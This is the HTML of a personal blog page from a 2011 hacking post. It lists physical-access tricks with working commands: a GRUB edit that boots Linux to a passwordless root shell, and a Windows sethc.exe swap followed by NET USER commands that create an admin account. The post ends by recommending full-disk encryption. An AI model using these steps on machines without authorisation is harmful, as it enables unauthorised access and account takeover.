@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Patterns in the Void - root shell</title>
+    <meta charset="utf-8" />
+    <meta name="robots" 
+          content="noindex, nofollow">
+    <link rel="stylesheet" 
+          href="https://blog.patternsinthevoid.net/theme/css/main.css" 
+          type="text/css" />
+        <link href="https://blog.patternsinthevoid.net/feeds/all.atom.xml" 
+          type="application/atom+xml" 
+          rel="alternate" 
+          title="Patterns in the Void Atom Feed" />
+                <link href="https://blog.patternsinthevoid.net/theme/prettify/prettify.css"
+          type="text/css"
+          rel="stylesheet" />
+    <script type="text/javascript" 
+            src="https://blog.patternsinthevoid.net/theme/prettify/prettify.js"></script>
+        <noscript>
+        <div style="width:80%;">
+        <p style="line-height:90%;margin:10px 10px 0px 10px;text-align:justify;text-indent:25px;">
+            <small>
+            <br>Hey, kudos! You don't run arbitrary scripts either!<br />
+            <br>My apologies for the javascript on this page...it's 
+            prettify.js for the syntax highlighting in code blocks. 
+            I added
+            <a href="https://blog.patternsinthevoid.net/theme/prettify/nope.css">one line of CSS</a>
+            for you; the rest of this site should work fine.<br />
+            <br>&#x24B6;&#38;&#x2665; isis<br /></small>
+        </p>
+        </div>
+        <link href="https://blog.patternsinthevoid.net/theme/prettify/nope.css"
+              type="text/css"
+              rel="stylesheet" />
+    </noscript>
+
+    <!--[if IE]>
+        <script src="https://blog.patternsinthevoid.net/theme/js/html5.js">
+        </script>
+        <![endif]-->
+
+    <!--[if lte IE 7]>
+        <link rel="stylesheet" type="text/css" media="all"
+              href="https://blog.patternsinthevoid.net/theme/css/ie.css"/>
+        <script src="https://blog.patternsinthevoid.net/theme/js/IE8.js"
+                type="text/javascript"></script>
+        <![endif]-->
+
+    <!--[if lt IE 7]>
+        <link rel="stylesheet" type="text/css" media="all"
+              href="https://blog.patternsinthevoid.net/theme/css/ie6.css"/>
+        <![endif]-->
+</head>
+
+<body id="index" class="home" onload="prettyPrint()">
+<a href="https://github.com/isislovecruft">
+        <img style="position: absolute; top: 0; right: 0; border: 0; max-width: 48px;"
+         src="https://blog.patternsinthevoid.net/theme/images/icons/github-tentacle-icon.png"
+         alt="code." />
+</a>
+<header id="banner" class="body">
+    <h1>
+        <a href="https://blog.patternsinthevoid.net/">Patterns in the Void 
+                    </a>
+    </h1>
+    <nav>
+        <ul>
+                                                            <li >
+                <a href="https://blog.patternsinthevoid.net/category/anarchism.html">anarchism</a>
+            </li>
+                                                                        <li >
+                <a href="https://blog.patternsinthevoid.net/category/hacking.html">hacking</a>
+            </li>
+                                                <li >
+                <a href="https://blog.patternsinthevoid.net/category/physics.html">physics</a>
+            </li>
+                                                <li >
+                <a href="https://blog.patternsinthevoid.net/category/travel.html">travel</a>
+            </li>
+                                </ul>
+    </nav>
+</header>
+
+<!-- /#banner -->
+        
+        
+
+<aside id="featured" class="body">
+    <article>
+        <h1 class="entry-title"><a href="https://blog.patternsinthevoid.net/cute-physical-access-tricks.html">Cute Physical Access&nbsp;Tricks</a></h1> 
+        <footer class="post-info">
+        <abbr class="published" title="2011-08-02T11:11:00">
+                Tuesday, 02 August 2011
+        </abbr>
+
+                <address class="vcard author">
+                By <a class="url fn" href="https://blog.patternsinthevoid.net/author/isis-agora-lovecruft.html">isis agora lovecruft</a>
+        </address>
+        <p>In <a href="https://blog.patternsinthevoid.net/category/hacking.html">hacking</a> </p>
+<p>tags: <a href="https://blog.patternsinthevoid.net/tag/hacking.html">hacking </a><a href="https://blog.patternsinthevoid.net/tag/linux.html">linux </a><a href="https://blog.patternsinthevoid.net/tag/password-reset.html">password reset </a><a href="https://blog.patternsinthevoid.net/tag/physical-access-tricks.html">physical access tricks </a><a href="https://blog.patternsinthevoid.net/tag/privilege-escalation.html">privilege escalation </a><a href="https://blog.patternsinthevoid.net/tag/root-shell.html">root shell </a><a href="https://blog.patternsinthevoid.net/tag/windows.html">windows </a></p>
+</footer><!-- /.post-info --><p>They&#8217;re cute because they&#8217;re so adorably&nbsp;simplistic:</p>
+<p>If you have physical access to a Linux box,&nbsp;do:</p>
+<p><code>Press ESC at the grub prompt.</code></p>
+<p>Press e for&nbsp;edit.</p>
+<p>Highlight the line that begins kernel ………, press&nbsp;e</p>
+<p>Go to the very end of the line, add rw&nbsp;init=/bin/bash</p>
+<p>press enter, then press b to boot your&nbsp;system.</p>
+<p>Your system will boot up to a passwordless root&nbsp;shell.</p>
+<p>For situations with physical access to a Windows box, boot into a live
+Linux <span class="caps">USB</span>/<span class="caps">CD</span> and&nbsp;do:</p>
+<p><code>mkdir /mnt/ntfs</code></p>
+<p>mount -t captive-ntfs /dev/hda1&nbsp;/mnt/ntfs</p>
+<p>cd&nbsp;/mnt/ntfs/windows/system32</p>
+<p>mv sethc.exe sethc.old; cp cmd.exe&nbsp;sethc.exe</p>
+<p>sync</p>
+<p>cd&nbsp;\~</p>
+<p>umount&nbsp;/mnt/ntfs</p>
+<p>shutdown&nbsp;–r</p>
+<p>Then, in the shell which appears, make an admin account by&nbsp;doing:</p>
+<p><code>NET USER admin password /add</code></p>
+<p><span class="caps">NET</span> <span class="caps">LOCALGROUP</span> administrators admin&nbsp;/add</p>
+<p>Of course, neither of these work if you&#8217;re using full-disk encryption.
+So, Windows users: <a href="http://www.truecrypt.org/">use TrueCrypt</a>! And Linux users: use <a href="http://www.makeuseof.com/tag/encrypt-your-files-in-linux-with-ecryptfs/">ecryptfs</a>
+and<a href="http://www.adamsinfo.com/linux-luks-crypt-howto/">luks</a>! Dualbooters can <a href="http://ubuntuforums.org/showthread.php?t=761530">use this tutorial</a>. And Mac users&#8230;from
+my understanding, you&#8217;re fucked and there&#8217;s no way to full-disk encrypt
+a Mac, but I don&#8217;t use Macs, so I could be wrong. Hey, it&#8217;s the price
+you pay for having a hipster computer.&nbsp;/snark!</p>
+<p>And full-disk encryption doesn&#8217;t void flaws in physical security issues,
+such as presented in the Evil Maid or Cold Boot attacks. Duh. If they
+can physically get to your computer, especially if they can get to it
+and then come back to it later, you&#8217;re still&nbsp;fucked.</p>    </article>
+        <p class="paginator">
+        Page 1 / 1
+    </p>
+    </aside><!-- /#featured -->
+                                            </ol><!-- /#posts-list -->
+                    </section><!-- /#content -->
+                                <section id="extras" 
+         class="body">
+        <div class="blogroll">
+        <h2>blogroll</h2>
+        <ul>
+                        <li><a href="https://fyb.patternsinthevoid.net">pelagus</a></li>
+                        <li><a href="https://blog.patternsinthevoid.net/isis.txt">clavium apertum</a></li>
+                        <li><a href="https://code.patternsinthevoid.net">codii et codicilli</a></li>
+                        <li><a href="https://blog.patternsinthevoid.net/calendar.html">horologii</a></li>
+                        <li><a href="https://blog.patternsinthevoid.net/pages/about-the-author.html">elogii biothanatum</a></li>
+                        <li><a href="https://blog.patternsinthevoid.net/pages/libris.html">libris atricoloris</a></li>
+                        <li><a href="https://image.patternsinthevoid.net">imaginis</a></li>
+                        <li><a href="https://sound.patternsinthevoid.net">strepitus</a></li>
+                    </ul>
+    </div>
+    <!-- /.blogroll -->
+            <div class="social">
+        <h2>social</h2>
+        <ul>
+            <li><a href="https://blog.patternsinthevoid.net/feeds/all.atom.xml" 
+                   type="application/atom+xml" 
+                   rel="alternate">atom feed</a>
+            </li>
+                        
+                        <li><a href="https://twitter.com/#!/isislovecruft">twitter</a></li>
+                        <li><a href="https://github.com/isislovecruft">github</a></li>
+                        <li><a href="https://gs.torproject.org/user/isis">#tor-status</a></li>
+                    </ul>
+    </div><!-- /.social -->
+    </section><!-- /#extras -->
+<footer id="contentinfo" class="body" position="relative">
+    <div style="height: 100%">
+        <address id="about">
+                <iframe src="//crypto.stanford.edu/flashproxy/embed.html" 
+        width="80" height="15"
+        frameborder="0" scrolling="no"
+        accesskey="i"
+        display="none"
+        groove>
+</iframe>
+<div id="over">You're currently helping people in censored regions with <a href="https://crypto.stanford.edu/flashproxy/options.html">FlashProxy</a>. Thanks!</div>                </address><!-- /#about -->
+    </div>
+        <div style="font-size: 6px; text-align: center; position: right; padding: 2px 1px">
+<table style="width: 15%;">
+    <tr><td><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.en_GB"><img style="border-width:0" src="../theme/images/icons/cc-by-nc-sa.png" /></a>
+<span property="dct:title" rel="dct:type"><a href="https://code.patternsinthevoid.net/">Patterns in the Void</a></span> by <a xmlns:cc="http://creativecommons.org/ns#" href="https://blog.patternsinthevoid.net" property="cc:attributionName" rel="cc:attributionURL">Isis Agora Lovecruft</a> is licensed <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.en_GB">CC-BY-NC-SA</a>.</td></tr>
+</table>
+</div>    </footer><!-- /#contentinfo -->
+</body>
+</html>
